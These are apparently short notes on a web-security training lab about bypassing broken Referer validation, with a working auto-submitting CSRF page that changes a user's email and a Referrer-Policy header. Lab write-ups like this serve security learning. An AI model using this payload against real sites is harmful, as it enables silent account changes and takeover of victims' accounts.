# Lab: CSRF with broken Referer validation

- The application is validating requests based on `Referer` header.
- The application is only checking its domain name in the `Referer`.
- Exploit ->

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?ac9e1fd51fefbc3ac0be0a12000400c0.web-security-academy.net')</script>
    <form action="https://ac9e1fd51fefbc3ac0be0a12000400c0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- However, it still does not work due to referrer policies.
- Resonse Header ->

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```
